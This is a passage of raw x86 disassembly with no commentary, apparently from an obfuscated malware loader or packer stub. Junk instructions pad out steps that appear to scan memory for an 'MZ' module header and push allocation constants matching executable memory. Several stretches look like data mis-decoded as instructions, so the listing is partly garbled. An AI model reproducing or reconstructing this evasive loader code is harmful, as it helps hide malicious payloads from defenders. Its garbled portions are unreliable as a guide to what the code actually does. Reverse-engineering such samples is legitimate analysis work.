  40370c:	add    DWORD PTR ds:0x43b137,eax
  403712:	pop    esi
  403713:	mov    eax,DWORD PTR [ebp+0x8]
  403716:	rol    eax,0x7
  403719:	push   eax
  40371a:	mov    DWORD PTR [ebp+0x8],eax
  40371d:	pop    esi
  40371e:	mov    esi,DWORD PTR [ebp+0x8]
  403721:	mov    eax,0x74
  403726:	xor    esi,eax
  403728:	inc    DWORD PTR ds:0x43b327
  40372e:	sub    esi,DWORD PTR [ebp+0x8]
  403731:	push   esi
  403732:	sub    DWORD PTR ds:0x43b589,esi
  403738:	pop    eax
  403739:	cmp    esi,0x16b
  40373f:	pop    edx
  403740:	pop    ecx
  403741:	sete   al
  403744:	ret    0x8
  403747:	outs   dx,DWORD PTR ds:[esi]
  403748:	push   ecx
  403749:	push   edx
  40374a:	call   DWORD PTR ds:0x418028
  403750:	mov    ds:0x43b81c,eax
  403755:	mov    ds:0x43b1be,eax
  40375a:	mov    esi,DWORD PTR [ebp+0x18]
  40375d:	mov    eax,0x20b1
  403762:	sub    esi,eax
  403764:	push   esi
  403765:	add    esi,0x39475
  40376b:	mov    DWORD PTR ds:0x43b7b7,esi
  403771:	add    DWORD PTR ds:0x43b55c,esi
  403777:	pop    DWORD PTR ds:0x43b3e6
  40377d:	mov    esi,DWORD PTR [ebp+0x10]
  403780:	mov    esi,0x12
  403785:	or     esi,eax
  403787:	rol    DWORD PTR ds:0x43b801,0x2
  40378e:	mov    eax,0xad7
  403793:	add    esi,eax
  403795:	mov    DWORD PTR ds:0x43b726,esi
  40379b:	mov    DWORD PTR ds:0x43b544,esi
  4037a1:	mov    eax,DWORD PTR [ebp+0x8]
  4037a4:	shr    eax,0x5
  4037a7:	mov    DWORD PTR [ebp+0x10],eax
  4037aa:	mov    DWORD PTR [ebp+0x14],eax
  4037ad:	mov    eax,DWORD PTR [ebp+0x8]
  4037b0:	shl    eax,1
  4037b2:	mov    DWORD PTR [ebp+0x18],eax
  4037b5:	sub    DWORD PTR ds:0x43b04f,eax
  4037bb:	pop    edx
  4037bc:	pop    ecx
  4037bd:	ret    0x18
  4037c0:	cli    
  4037c1:	inc    ebx
  4037c2:	xchg   ebx,eax
  4037c3:	xor    al,0x51
  4037c5:	push   edx
  4037c6:	push   0x17
  4037c8:	pop    eax
  4037c9:	dec    eax
  4037ca:	ror    DWORD PTR ds:0x43b71b,0x7
  4037d1:	push   eax
  4037d2:	mov    DWORD PTR [ebp+0x8],eax
  4037d5:	pop    DWORD PTR ds:0x43b090
  4037db:	mov    esi,DWORD PTR [ebp+0x8]
  4037de:	mov    eax,0x1021
  4037e3:	add    esi,eax
  4037e5:	rol    DWORD PTR ds:0x43b453,0x5
  4037ec:	add    DWORD PTR ds:0x43b68f,esi
  4037f2:	mov    eax,DWORD PTR [ebp+0x8]
  4037f5:	sub    eax,0x44
  4037f8:	inc    DWORD PTR ds:0x43b0d6
  4037fe:	mov    DWORD PTR [ebp+0x8],eax
  403801:	mov    eax,DWORD PTR [ebp+0x8]
  403804:	mov    esi,0xc8f
  403809:	add    eax,esi
  40380b:	rol    DWORD PTR ds:0x43b1f8,0x7
  403812:	rol    eax,1
  403814:	push   eax
  403815:	sub    DWORD PTR ds:0x43b451,eax
  40381b:	pop    DWORD PTR ds:0x43b3d2
  403821:	mov    eax,DWORD PTR [ebp+0x8]
  403824:	mov    esi,0x65b5c
  403829:	xor    eax,esi
  40382b:	ror    DWORD PTR ds:0x43b3a3,0x5
  403832:	mov    DWORD PTR [ebp+0x8],eax
  403835:	mov    eax,DWORD PTR [ebp+0x8]
  403838:	inc    eax
  403839:	push   0xb0ea3
  40383e:	pop    DWORD PTR ds:0x43b254
  403844:	mov    esi,0x719
  403849:	add    eax,esi
  40384b:	mov    DWORD PTR [ebp+0x8],eax
  40384e:	add    DWORD PTR ds:0x43b4c4,eax
  403854:	pop    edx
  403855:	pop    ecx
  403856:	ret    0x4
  403859:	rcl    cl,cl
  40385b:	xchg   DWORD PTR [ebp-0x75],edx
  40385e:	in     al,dx
  40385f:	sub    esp,0x3c
  403862:	push   ecx
  403863:	push   edx
  403864:	push   0x54128c00
  403869:	push   0x43a09f00
  40386e:	push   0x792c8900
  403873:	push   0x2940a200
  403878:	call   DWORD PTR ds:0x4180a0
  40387e:	mov    DWORD PTR [ebp-0x38],eax
  403881:	mov    DWORD PTR [ebp-0x28],eax
  403884:	mov    esi,DWORD PTR [ebp+0x4]
  403887:	inc    esi
  403888:	ror    DWORD PTR ds:0x43b5c3,0x6
  40388f:	mov    eax,0x7
  403894:	xor    esi,eax
  403896:	push   esi
  403897:	sub    DWORD PTR ds:0x43b08a,esi
  40389d:	pop    DWORD PTR ds:0x43b448
  4038a3:	mov    esi,DWORD PTR [ebp+0x4]
  4038a6:	inc    esi
  4038a7:	dec    DWORD PTR ds:0x43b43a
  4038ad:	sub    DWORD PTR ds:0x43b436,esi
  4038b3:	mov    eax,DWORD PTR [ebp+0x4]
  4038b6:	mov    esi,0x2373
  4038bb:	imul   eax,esi,0x2e
  4038be:	mov    DWORD PTR [ebp-0x24],eax
  4038c1:	sub    DWORD PTR ds:0x43b670,eax
  4038c7:	mov    esi,DWORD PTR [ebp+0x4]
  4038ca:	dec    esi
  4038cb:	add    DWORD PTR ds:0x43b0a5,esi
  4038d1:	and    esi,0x58
  4038d7:	ror    DWORD PTR ds:0x43b0db,0x6
  4038de:	sub    DWORD PTR ds:0x43b885,esi
  4038e4:	mov    eax,DWORD PTR [ebp+0x4]
  4038e7:	dec    eax
  4038e8:	ror    DWORD PTR ds:0x43b3b0,1
  4038ee:	mov    DWORD PTR [ebp-0x10],eax
  4038f1:	pop    edx
  4038f2:	pop    ecx
  4038f3:	mov    esp,ebp
  4038f5:	pop    ebp
  4038f6:	ret    
  4038f7:	xor    esi,esi
  4038f9:	ret    0xc
  4038fc:	pop    eax
  4038fd:	dec    edx
  4038fe:	xchg   ebp,eax
  4038ff:	int3   
  403900:	mov    eax,0x1eb810c
  403905:	add    BYTE PTR [eax],al
  403907:	add    BYTE PTR [ebp+0xc2d],cl
  40390d:	add    BYTE PTR [eax+0x30],ch
  403910:	mov    ah,0x43
  403912:	add    bh,bh
  403914:	adc    eax,0x418094
  403919:	mov    ds:0x43b4df,eax
  40391e:	mov    DWORD PTR [ebp-0x10],eax
  403921:	dec    ebx
  403922:	add    esi,edi
  403924:	inc    ebp
  403925:	sti    
  403926:	repz jb 0x40397d
  403929:	ja     0x40396b
  40392b:	pusha  
  40392c:	push   ebp
  40392d:	mov    ebp,esp
  40392f:	sub    esp,0x60
  403932:	mov    edi,ebx
  403934:	push   edi
  403935:	lea    ecx,[edx+edi*1+0x1d3a]
  40393c:	add    ecx,DWORD PTR ds:0x43b4b8
  403942:	add    DWORD PTR ds:0x43b21e,ecx
  403948:	mov    DWORD PTR [ebp-0x4],ecx
  40394b:	mov    ecx,edx
  40394d:	sub    ecx,0x14849
  403953:	rol    DWORD PTR ds:0x43b346,0x3
  40395a:	mov    ebx,0x3be
  40395f:	imul   ecx,ebx,0x40
  403962:	push   ecx
  403963:	add    DWORD PTR ds:0x43b65d,ecx
  403969:	pop    ecx
  40396a:	mov    esi,0x43b8e6
  40396f:	mov    ebx,edx
  403971:	inc    ebx
  403972:	sub    DWORD PTR ds:0x43b8a4,ebx
  403978:	mov    DWORD PTR ds:0x43b59a,ebx
  40397e:	lea    ecx,[eax+0x88]
  403984:	shl    ecx,1
  403986:	dec    DWORD PTR ds:0x43b6b7
  40398c:	mov    DWORD PTR ds:0x43b54b,ecx
  403992:	push   0x27
  403994:	pop    ebx
  403995:	inc    DWORD PTR ds:0x43b1a6
  40399b:	sub    DWORD PTR ds:0x43b341,ebx
  4039a1:	mov    ecx,edi
  4039a3:	push   ecx
  4039a4:	add    ecx,0x58
  4039a7:	ror    DWORD PTR ds:0x43b0ea,0x5
  4039ae:	sub    DWORD PTR ds:0x43b3cc,ecx
  4039b4:	pop    DWORD PTR ds:0x43b440
  4039ba:	mov    edx,0x6280f
  4039bf:	ror    edx,1
  4039c1:	push   edx
  4039c2:	shr    edx,1
  4039c4:	inc    DWORD PTR ds:0x43b4e7
  4039ca:	mov    DWORD PTR ds:0x43b15b,edx
  4039d0:	pop    ecx
  4039d1:	push   0xe
  4039d3:	pop    ebx
  4039d4:	shr    ebx,0x7
  4039d7:	ror    DWORD PTR ds:0x43b273,0x5
  4039de:	add    DWORD PTR ds:0x43b49a,ebx
  4039e4:	push   esi
  4039e5:	lea    ebx,[ebp+ecx*1+0xc91]
  4039ec:	mov    ebx,0x75
  4039f1:	or     ebx,edx
  4039f3:	push   ebx
  4039f4:	add    DWORD PTR ds:0x43b272,ebx
  4039fa:	pop    DWORD PTR ds:0x43b28d
  403a00:	push   0xbde48
  403a05:	pop    ebx
  403a06:	add    ebx,0x7b
  403a09:	inc    DWORD PTR ds:0x43b810
  403a0f:	mov    ecx,0x13d9
  403a14:	add    ebx,ecx
  403a16:	push   ebx
  403a17:	mov    DWORD PTR [ebp-0x30],ebx
  403a1a:	pop    edx
  403a1b:	lea    edx,[edi+esi*1+0x195d]
  403a22:	shr    edx,1
  403a24:	ror    DWORD PTR ds:0x43b477,0x4
  403a2b:	add    DWORD PTR ds:0x43b2ae,edx
  403a31:	mov    eax,0x4b920d3b
  403a36:	lea    ecx,[edx+0x8a]
  403a3c:	sub    ecx,DWORD PTR ds:0x43b534
  403a42:	inc    DWORD PTR ds:0x43b53e
  403a48:	mov    DWORD PTR [ebp-0x38],ecx
  403a4b:	mov    edx,0xada4c
  403a50:	and    edx,0x52239800
  403a56:	ror    DWORD PTR ds:0x43b24c,0x2
  403a5d:	sub    DWORD PTR ds:0x43b4b7,edx
  403a63:	lods   al,BYTE PTR ds:[esi]
  403a64:	sub    al,ah
  403a66:	xor    ebx,DWORD PTR ds:0x452164
  403a6c:	mov    edx,0x3a
  403a71:	add    ecx,0x1
  403a77:	sub    ebx,edx
  403a79:	mov    edx,0x66
  403a7e:	mov    ecx,0x7b
  403a83:	sub    ecx,0x2
  403a89:	mov    ebx,ecx
  403a8b:	rol    al,0x2
  403a8e:	mov    DWORD PTR [ebp-0x3c],eax
  403a91:	inc    ecx
  403a92:	or     edx,0x9
  403a95:	sub    ecx,0x2
  403a9b:	test   edi,edx
  403a9d:	jne    0x403aa3
  403a9f:	or     ebx,0x5
  403aa2:	dec    ecx
  403aa3:	lea    edx,[eax+0xcd]
  403aa9:	mov    ebx,0xe4
  403aae:	dec    edx
  403aaf:	rol    al,0x1
  403ab2:	mov    ebx,edx
  403ab4:	mov    ebx,0x75
  403ab9:	lea    edx,[ecx+0x0]
  403abf:	dec    ebx
  403ac0:	add    edx,0x1
  403ac6:	add    ebx,ecx
  403ac8:	sub    al,0x3a
  403aca:	lea    edx,[edi+0xd]
  403ad0:	mov    ebx,esi
  403ad2:	cmp    esi,0xffffff97
  403ad5:	jbe    0x403ae5
  403ad7:	mov    ecx,0x76
  403adc:	add    edx,ecx
  403ade:	add    ecx,edx
  403ae0:	add    edx,ecx
  403ae2:	mov    DWORD PTR [ebp-0x3c],ebx
  403ae5:	mov    ecx,0x84
  403aea:	add    edx,esi
  403aec:	add    ebx,esi
  403aee:	xor    al,0x84
  403af0:	mov    ecx,edx
  403af2:	lea    ecx,[ebx+0x36]
  403af8:	lea    ecx,[edi+0x8]
  403afe:	lea    ecx,[edx+0x6]
  403b04:	add    ebx,edx
  403b06:	lea    ebx,[eax+0x49]
  403b0c:	sub    edx,edi
  403b0e:	mov    DWORD PTR [ebp-0x54],ebx
  403b11:	add    al,0x84
  403b13:	add    edx,eax
  403b15:	add    edx,ecx
  403b17:	add    ecx,0x1
  403b1d:	sub    edx,0x2
  403b23:	add    edx,0x2
  403b29:	lea    ecx,[edx+0xf]
  403b2f:	ror    al,0x2
  403b32:	cmp    edx,0xffffffc2
  403b35:	jnp    0x403b47
  403b37:	sub    ecx,0x1
  403b3d:	mov    ebx,0xd3
  403b42:	mov    ecx,ebx
  403b44:	add    ecx,esi
  403b46:	inc    edx
  403b47:	sub    ecx,0x1
  403b4d:	sub    edx,edi
  403b4f:	or     ecx,0x22
  403b52:	or     edx,0x42
  403b55:	sub    ebx,edi
  403b57:	xor    al,ah
  403b59:	add    ebx,0x2
  403b5f:	add    edx,ebx
  403b61:	mov    ebx,eax
  403b63:	dec    ecx
  403b64:	or     ecx,0x32
  403b67:	mov    DWORD PTR [ebp-0x1c],0x31
  403b6e:	or     edx,DWORD PTR ds:0x469604
  403b74:	sub    al,ah
  403b76:	or     ecx,0x34
  403b79:	lea    ecx,ds:0xf6
  403b7f:	add    ecx,ebx
  403b81:	lea    ecx,[edi+0x52]
  403b87:	lea    ebx,ds:0x1d
  403b8d:	dec    ecx
  403b8e:	lea    edx,[esi+0x6]
  403b94:	sub    ebx,ecx
  403b96:	xor    ebx,eax
  403b98:	rol    ah,0x1
  403b9b:	mov    ebx,0x1
  403ba0:	inc    ebx
  403ba1:	rol    DWORD PTR ds:0x43b74e,0x6
  403ba8:	mov    DWORD PTR ds:0x43b68d,ebx
  403bae:	lea    ecx,[ebx+0x8b]
  403bb4:	inc    DWORD PTR ds:0x43b747
  403bba:	inc    ecx
  403bbb:	mov    DWORD PTR [ebp-0x60],ecx
  403bbe:	mov    DWORD PTR [ebp-0x34],ecx
  403bc1:	push   0x9a52d
  403bc6:	pop    edx
  403bc7:	and    edx,0x7abbd900
  403bcd:	mov    DWORD PTR [ebp-0x1c],edx
  403bd0:	sub    edx,DWORD PTR ds:0x43b2f9
  403bd6:	push   0xfbcb8
  403bdb:	pop    DWORD PTR ds:0x43b710
  403be1:	mov    DWORD PTR [ebp-0x40],edx
  403be4:	stos   BYTE PTR es:[edi],al
  403be5:	xor    ebx,ebx
  403be7:	mov    ecx,0x10a9
  403bec:	add    ebx,ecx
  403bee:	mov    DWORD PTR ds:0x43b496,ebx
  403bf4:	sub    DWORD PTR ds:0x43b1e3,ebx
  403bfa:	push   0x71
  403bfc:	pop    edx
  403bfd:	sub    edx,0x61
  403c00:	push   edx
  403c01:	rol    edx,1
  403c03:	mov    DWORD PTR ds:0x43b12f,edx
  403c09:	mov    DWORD PTR [ebp-0x1c],edx
  403c0c:	pop    edx
  403c0d:	mov    ebx,0x49
  403c12:	mov    edx,0x22c2
  403c17:	imul   ebx,edx,0x48
  403c1a:	rol    DWORD PTR ds:0x43b35a,0x2
  403c21:	mov    DWORD PTR [ebp-0x8],ebx
  403c24:	push   esi
  403c25:	pop    DWORD PTR ds:0x43c904
  403c2b:	mov    edx,0x0
  403c30:	mov    ebx,0x1678
  403c35:	sub    edx,ebx
  403c37:	push   edx
  403c38:	mov    DWORD PTR [ebp-0x5c],edx
  403c3b:	pop    ebx
  403c3c:	xor    edx,edx
  403c3e:	add    edx,DWORD PTR ds:0x43b70a
  403c44:	inc    DWORD PTR ds:0x43b2d3
  403c4a:	shr    edx,1
  403c4c:	push   edx
  403c4d:	add    DWORD PTR ds:0x43b314,edx
  403c53:	pop    ebx
  403c54:	mov    edx,eax
  403c56:	mov    ecx,0x38e
  403c5b:	add    edx,ecx
  403c5d:	mov    DWORD PTR [ebp-0x50],edx
  403c60:	add    DWORD PTR ds:0x43b3a9,edx
  403c66:	cmp    DWORD PTR ds:0x43c904,0x43c6b6
  403c70:	jne    0x403a36
  403c76:	lea    edx,[eax+0x90]
  403c7c:	mov    ecx,0x1fe2
  403c81:	add    edx,ecx
  403c83:	mov    DWORD PTR ds:0x43b4c8,edx
  403c89:	mov    DWORD PTR ds:0x43b4ea,edx
  403c8f:	push   0x70
  403c91:	pop    edx
  403c92:	shr    edx,0x3
  403c95:	inc    DWORD PTR ds:0x43b61a
  403c9b:	dec    edx
  403c9c:	mov    DWORD PTR [ebp-0x3c],edx
  403c9f:	mov    DWORD PTR ds:0x43b246,edx
  403ca5:	push   0xa94c2
  403caa:	pop    ebx
  403cab:	push   ebx
  403cac:	sub    DWORD PTR ds:0x43b66b,ebx
  403cb2:	pop    DWORD PTR ds:0x43b360
  403cb8:	sub    edi,0xdd0
  403cbe:	mov    edx,ebx
  403cc0:	mov    ecx,0x15a3
  403cc5:	imul   edx,ecx,0x56
  403cc8:	push   edx
  403cc9:	mov    edx,0xec43f
  403cce:	or     edx,ebx
  403cd0:	sub    DWORD PTR ds:0x43b158,edx
  403cd6:	mov    DWORD PTR [ebp-0x3c],edx
  403cd9:	pop    DWORD PTR ds:0x43b1df
  403cdf:	xor    ecx,ecx
  403ce1:	add    ecx,0x1ecd3
  403ce7:	dec    DWORD PTR ds:0x43b236
  403ced:	mov    DWORD PTR ds:0x43b6b0,ecx
  403cf3:	pop    esi
  403cf4:	lea    edx,[esi+edx*8+0x2a3]
  403cfb:	and    edx,0x11
  403d01:	mov    DWORD PTR ds:0x43b721,edx
  403d07:	add    edx,DWORD PTR ds:0x43b022
  403d0d:	push   edx
  403d0e:	sub    DWORD PTR ds:0x43b5c8,edx
  403d14:	pop    DWORD PTR ds:0x43b47b
  403d1a:	mov    ecx,0x0
  403d1f:	sub    ecx,0x16
  403d22:	add    DWORD PTR ds:0x43b40a,ecx
  403d28:	add    DWORD PTR ds:0x43b835,ecx
  403d2e:	pop    edi
  403d2f:	mov    esp,ebp
  403d31:	pop    ebp
  403d32:	add    edx,ebx
  403d34:	mov    ebx,esi
  403d36:	ret    0x8
  403d39:	repnz dec eax
  403d3b:	pop    eax
  403d3c:	and    al,0x80
  403d3e:	dec    esi
  403d3f:	add    eax,0xd8de833
  403d44:	push   es
  403d45:	add    BYTE PTR [eax],al
  403d47:	add    BYTE PTR [ecx+0x2c1],al
  403d4d:	add    BYTE PTR [ebx],cl
  403d4f:	adc    eax,0x473adc
  403d54:	lea    edi,ds:0x1b
  403d5a:	dec    edx
  403d5b:	add    eax,edx
  403d5d:	inc    esi
  403d5e:	xlat   BYTE PTR ds:[ebx]
  403d5f:	mov    eax,ds:0xd26880e9
  403d64:	push   ebp
  403d65:	mov    ebp,esp
  403d67:	sub    esp,0x14
  403d6a:	push   0x63
  403d6c:	pop    eax
  403d6d:	shl    eax,1
  403d6f:	inc    DWORD PTR ds:0x43b1b8
  403d75:	mov    ds:0x43b3e8,eax
  403d7a:	mov    eax,0x0
  403d7f:	add    eax,DWORD PTR ds:0x43b73d
  403d85:	add    DWORD PTR ds:0x43b0c7,eax
  403d8b:	mov    eax,0x66
  403d90:	or     eax,edi
  403d92:	dec    DWORD PTR ds:0x43b82f
  403d98:	mov    ds:0x43b558,eax
  403d9d:	mov    eax,ebp
  403d9f:	lea    esi,[eax+0xb0]
  403da5:	push   esi
  403da6:	sub    DWORD PTR ds:0x43b72a,esi
  403dac:	pop    esi
  403dad:	mov    ebx,0x1d
  403db2:	shl    ebx,1
  403db4:	push   ebx
  403db5:	add    ebx,0x2b
  403db8:	add    DWORD PTR ds:0x43b837,ebx
  403dbe:	add    DWORD PTR ds:0x43b612,ebx
  403dc4:	pop    esi
  403dc5:	mov    eax,DWORD PTR [eax]
  403dc7:	mov    edi,0xe76ea
  403dcc:	rol    edi,1
  403dce:	add    DWORD PTR ds:0x43b681,edi
  403dd4:	inc    edi
  403dd5:	push   edi
  403dd6:	mov    DWORD PTR [ebp-0x8],edi
  403dd9:	pop    DWORD PTR ds:0x43b1b8
  403ddf:	add    eax,0x4
  403de2:	mov    edi,0x73
  403de7:	inc    edi
  403de8:	push   edi
  403de9:	add    edi,DWORD PTR ds:0x43b1f5
  403def:	ror    DWORD PTR ds:0x43b542,0x5
  403df6:	mov    DWORD PTR [ebp-0x8],edi
  403df9:	pop    ebx
  403dfa:	mov    esi,edi
  403dfc:	add    esi,0x10
  403dff:	mov    DWORD PTR [ebp-0x4],esi
  403e02:	push   esi
  403e03:	sub    DWORD PTR ds:0x43b18d,esi
  403e09:	pop    edi
  403e0a:	mov    eax,DWORD PTR [eax]
  403e0c:	mov    ebx,0x5
  403e11:	inc    ebx
  403e12:	push   ebx
  403e13:	mov    DWORD PTR ds:0x43b0c4,ebx
  403e19:	sub    DWORD PTR ds:0x43b384,ebx
  403e1f:	pop    DWORD PTR ds:0x43b6a4
  403e25:	sub    eax,0x10000
  403e2a:	mov    esi,eax
  403e2c:	mov    DWORD PTR ds:0x43b21e,esi
  403e32:	add    DWORD PTR ds:0x43b5fb,esi
  403e38:	mov    ebx,esi
  403e3a:	mov    edi,0x1051
  403e3f:	imul   ebx,edi,0x38
  403e42:	push   ebx
  403e43:	push   0x7e
  403e45:	pop    DWORD PTR ds:0x43b23d
  403e4b:	add    DWORD PTR ds:0x43b58f,ebx
  403e51:	pop    DWORD PTR ds:0x43b79f
  403e57:	and    eax,0xffff0000
  403e5c:	mov    ebx,0x0
  403e61:	ror    ebx,1
  403e63:	mov    DWORD PTR ds:0x43b2bf,ebx
  403e69:	sub    DWORD PTR ds:0x43b5a9,ebx
  403e6f:	mov    esi,0x0
  403e74:	inc    esi
  403e75:	mov    DWORD PTR [ebp-0x14],esi
  403e78:	mov    DWORD PTR ds:0x43b3d4,esi
  403e7e:	mov    esi,0xcd4ee
  403e83:	and    esi,0x8c910d00
  403e89:	push   esi
  403e8a:	mov    DWORD PTR ds:0x43b7ed,esi
  403e90:	pop    DWORD PTR ds:0x43b006
  403e96:	mov    edx,0xdc2730bc
  403e9b:	xor    edi,edi
  403e9d:	add    edi,DWORD PTR ds:0x43b482
  403ea3:	push   edi
  403ea4:	push   0x980fd
  403ea9:	pop    DWORD PTR ds:0x43b41a
  403eaf:	mov    DWORD PTR ds:0x43b637,edi
  403eb5:	pop    edi
  403eb6:	mov    esi,0x0
  403ebb:	rol    esi,1
  403ebd:	sub    DWORD PTR ds:0x43b40c,esi
  403ec3:	add    esi,0x630b
  403ec9:	dec    DWORD PTR ds:0x43b490
  403ecf:	add    DWORD PTR ds:0x43b36c,esi
  403ed5:	xor    edx,0xdc276af1
  403edb:	mov    esi,0x618fe
  403ee0:	mov    ebx,0x5d0
  403ee5:	sub    esi,ebx
  403ee7:	push   esi
  403ee8:	mov    DWORD PTR [ebp-0x4],esi
  403eeb:	mov    DWORD PTR ds:0x43b0fb,esi
  403ef1:	pop    DWORD PTR ds:0x43b7ad
  403ef7:	push   0x48
  403ef9:	pop    esi
  403efa:	mov    esi,0x3b
  403eff:	or     esi,ebx
  403f01:	push   esi
  403f02:	mov    DWORD PTR ds:0x43b3c7,esi
  403f08:	pop    DWORD PTR ds:0x43b87d
  403f0e:	cmp    WORD PTR [eax],dx
  403f11:	jne    0x403dea
  403f17:	lea    edi,[esi+0xbe]
  403f1d:	mov    ebx,0xba7
  403f22:	sub    edi,ebx
  403f24:	push   edi
  403f25:	mov    DWORD PTR ds:0x43b8cf,edi
  403f2b:	pop    ebx
  403f2c:	mov    esi,0x49b56
  403f31:	sub    esi,DWORD PTR ds:0x43b84e
  403f37:	mov    DWORD PTR ds:0x43b7f8,esi
  403f3d:	rol    esi,0x8
  403f40:	push   esi
  403f41:	add    DWORD PTR ds:0x43b05c,esi
  403f47:	pop    DWORD PTR ds:0x43b764
  403f4d:	push   0x0
  403f4f:	lea    esi,[esi+0xb6]
  403f55:	shl    esi,0x2
  403f58:	add    DWORD PTR ds:0x43b441,esi
  403f5e:	mov    esi,0x10
  403f63:	or     esi,edi
  403f65:	push   esi
  403f66:	add    DWORD PTR ds:0x43b32f,esi
  403f6c:	pop    DWORD PTR ds:0x43b148
  403f72:	push   0x1287fc1b
  403f77:	push   0x65
  403f79:	pop    esi
  403f7a:	sub    esi,DWORD PTR ds:0x43b4ca
  403f80:	push   0x58
  403f82:	pop    DWORD PTR ds:0x43b7a9
  403f88:	mov    esi,0x6850f
  403f8d:	or     esi,edi
  403f8f:	push   esi
  403f90:	sub    DWORD PTR ds:0x43b8b8,esi
  403f96:	pop    DWORD PTR ds:0x43b4a6
  403f9c:	lea    edi,[ebx+0xbb]
  403fa2:	mov    esi,0x15f3
  403fa7:	sub    edi,esi
  403fa9:	rol    DWORD PTR ds:0x43b4b0,0x7
  403fb0:	mov    ebx,0xfc9
  403fb5:	add    edi,ebx
  403fb7:	push   edi
  403fb8:	mov    DWORD PTR [ebp-0x4],edi
  403fbb:	pop    DWORD PTR ds:0x43b10c
  403fc1:	sub    DWORD PTR [esp],0xaf188faf
  403fc8:	push   0xf084f124
  403fcd:	xor    esi,esi
  403fcf:	mov    esi,0x1fccc
  403fd4:	or     esi,ebx
  403fd6:	mov    DWORD PTR [ebp-0x4],esi
  403fd9:	mov    edi,0x26dd
  403fde:	imul   esi,edi,0xf
  403fe1:	inc    DWORD PTR ds:0x43b444
  403fe7:	sub    DWORD PTR ds:0x43b46b,esi
  403fed:	mov    edi,0x11
  403ff2:	and    edi,0x31ba2700
  403ff8:	push   edi
  403ff9:	mov    DWORD PTR [ebp-0x10],edi
  403ffc:	pop    esi
  403ffd:	mov    ebx,0x0
  404002:	inc    ebx
  404003:	rol    DWORD PTR ds:0x43b58b,0x6
  40400a:	add    DWORD PTR ds:0x43b04c,ebx
  404010:	xor    esi,esi
  404012:	inc    esi
  404013:	dec    DWORD PTR ds:0x43b0b3
  404019:	rol    esi,0x3
  40401c:	mov    DWORD PTR ds:0x43b2f3,esi
  404022:	sub    DWORD PTR ds:0x43b045,esi
  404028:	sub    DWORD PTR [esp],0xaf188faf
  40402f:	push   0x238af905
  404034:	mov    ebx,0x67
  404039:	dec    ebx
  40403a:	push   ebx
  40403b:	sub    ebx,DWORD PTR ds:0x43b86d
  404041:	add    DWORD PTR ds:0x43b2e3,ebx
  404047:	add    DWORD PTR ds:0x43b721,ebx
  40404d:	pop    DWORD PTR ds:0x43b765
  404053:	mov    esi,ebx
  404055:	mov    DWORD PTR [ebp-0x8],esi
  404058:	mov    DWORD PTR ds:0x43b70f,esi
  40405e:	sub    DWORD PTR [esp],0xaf188faf
  404065:	push   esp
  404066:	push   0x13
  404068:	pop    ebx
  404069:	dec    ebx
  40406a:	add    DWORD PTR ds:0x43b7d6,ebx
  404070:	add    DWORD PTR ds:0x43b8bd,ebx
  404076:	mov    edi,0x22
  40407b:	dec    DWORD PTR ds:0x43b2f3
  404081:	mov    ebx,0x11f3
  404086:	imul   edi,ebx,0x24
  404089:	push   edi
  40408a:	mov    DWORD PTR [ebp-0x14],edi
  40408d:	pop    ebx
  40408e:	mov    edi,0x0
  404093:	sub    edi,DWORD PTR ds:0x43b646
  404099:	push   edi
  40409a:	ror    edi,0x3
  40409d:	mov    DWORD PTR [ebp-0x8],edi
  4040a0:	add    DWORD PTR ds:0x43b63b,edi
  4040a6:	pop    DWORD PTR ds:0x43b589
  4040ac:	push   eax
  4040ad:	xor    esi,esi
  4040af:	add    esi,DWORD PTR ds:0x43b3a4
  4040b5:	ror    DWORD PTR ds:0x43b762,0x4
  4040bc:	mov    DWORD PTR [ebp-0x10],esi
  4040bf:	xor    ebx,ebx
  4040c1:	mov    edi,0xfec9
  4040c6:	xor    ebx,edi
  4040c8:	mov    DWORD PTR [ebp-0x4],ebx
  4040cb:	mov    DWORD PTR [ebp-0x14],ebx
  4040ce:	call   DWORD PTR ds:0x418030
  4040d4:	push   0x7d
  4040d6:	pop    esi
  4040d7:	mov    edi,0xf05ab
  4040dc:	xor    esi,edi
  4040de:	push   esi
  4040df:	add    DWORD PTR ds:0x43b874,esi
  4040e5:	pop    edi
  4040e6:	add    esp,0x10
  4040e9:	mov    edi,0xae80
  4040ee:	mov    esi,0x96d
  4040f3:	sub    edi,esi
  4040f5:	rol    DWORD PTR ds:0x43b3f3,0x3
  4040fc:	mov    DWORD PTR ds:0x43b203,edi
  404102:	push   0x40
  404107:	mov    ebx,0x0
  40410c:	mov    edi,0x2689
  404111:	imul   ebx,edi,0x53
  404114:	push   ebx
  404115:	add    DWORD PTR ds:0x43b643,ebx
  40411b:	pop    edi
  40411c:	mov    edi,0x3000
  404121:	mov    ebx,edi
  404123:	push   ebx
  404124:	mov    edi,0x8d213
  404129:	mov    ebx,0x216b
  40412e:	imul   edi,ebx,0x1f
  404131:	push   edi
  404132:	mov    DWORD PTR [ebp-0x4],edi
  404135:	pop    DWORD PTR ds:0x43b783
  40413b:	push   0xc
  40413d:	pop    edi
  40413e:	add    edi,DWORD PTR ds:0x43b0f9
  404144:	add    DWORD PTR ds:0x43b197,edi
  40414a:	sub    DWORD PTR ds:0x43b25f,edi
  404150:	mov    esi,0x0
  404155:	sub    esi,0x25ea5
  40415b:	mov    DWORD PTR ds:0x43b892,esi
  404161:	mov    DWORD PTR ds:0x43b5f6,esi
  404167:	mov    ecx,0x4665c
  40416c:	mov    esi,ecx
  40416e:	push   esi
  40416f:	mov    edi,eax
  404171:	shl    edi,0x3
  404174:	push   edi
  404175:	add    DWORD PTR ds:0x43b600,edi
  40417b:	pop    DWORD PTR ds:0x43b4cf
  404181:	mov    edi,0x0
  404186:	inc    edi
  404187:	push   edi
  404188:	mov    DWORD PTR ds:0x43b571,edi
  40418e:	pop    DWORD PTR ds:0x43b88e
  404194:	lea    ebx,[ebp+ebp*1+0xf92]
  40419b:	sub    ebx,DWORD PTR ds:0x43b607
  4041a1:	push   0x7
  4041a3:	pop    DWORD PTR ds:0x43b369
  4041a9:	and    ebx,0x4b2b8a00
  4041af:	push   ebx
  4041b0:	mov    DWORD PTR ds:0x43b1a4,ebx
  4041b6:	pop    DWORD PTR ds:0x43b455
  4041bc:	push   0x0
  4041c1:	mov    ebx,0x0
  4041c6:	mov    esi,0x1072
  4041cb:	add    ebx,esi
  4041cd:	mov    DWORD PTR ds:0x43b81e,ebx
  4041d3:	add    DWORD PTR ds:0x43b68d,ebx
  4041d9:	lea    esi,[esi+esi*4+0x1777]
  4041e0:	ror    esi,0x6
  4041e3:	push   esi
  4041e4:	mov    edi,0xc79
  4041e9:	add    esi,edi
  4041eb:	inc    DWORD PTR ds:0x43b1eb
